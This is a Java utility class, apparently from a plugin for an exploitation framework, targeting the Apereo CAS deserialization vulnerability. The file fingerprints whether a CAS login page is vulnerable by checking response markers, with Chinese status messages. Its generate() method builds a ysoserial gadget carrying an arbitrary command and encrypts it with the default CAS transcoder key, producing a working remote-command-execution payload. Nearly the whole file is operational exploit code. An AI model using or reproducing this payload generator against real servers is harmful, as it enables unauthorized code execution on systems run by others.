package me.gv7.woodpecker.vuldb.execution.deserial;

import me.gv7.woodpecker.plugin.IResultOutput;
import me.gv7.woodpecker.requests.Requests;
import me.gv7.woodpecker.yso.payloads.ObjectPayload;
import org.apereo.spring.webflow.plugin.EncryptedTranscoder;
import org.cryptacular.util.CodecUtil;

public class CommonUtil {

    public static void checkUrl(String url,IResultOutput resultOutput){
        if(!url.endsWith("/cas/login")){
            resultOutput.infoPrintln("注意：你输入的地址不一定正确，一般CAS反序列化漏洞URL在登录接口(/cas/login)，请人工确定一下。");
        }
    }

    public static boolean basicCheckVuln(String targetURL, IResultOutput result){
        String s = Requests.get(targetURL).verify(false).followRedirect(true).send().readToText();
        if (s.contains("_AAAA")){
            return true;
        }else if (s.contains("s1\"")){
            result.errorPrintln("目标不存在漏洞！");
        }else if (s.contains("_ZXlK")){
            result.errorPrintln("有源码请手动分析key来利用");
        }
        return false;
    }

    public static boolean basicCheckVuln(String targetURL){
        String s = Requests.get(targetURL).verify(false).followRedirect(true).send().readToText();
        return s.contains("_AAAA");
    }

    public static String generate(String className, String command) throws Exception{
        Object o = ObjectPayload.Utils.makePayloadObject(className, command);
        EncryptedTranscoder transcoder = new EncryptedTranscoder();
        byte[] aesEncoded = transcoder.encode(o);
        String b64Encoded = CodecUtil.b64(aesEncoded);
        String output = "67554b79-6cc1-4d89-a933-e99eb21a0ac2_" + b64Encoded;
        return output;
    }
}
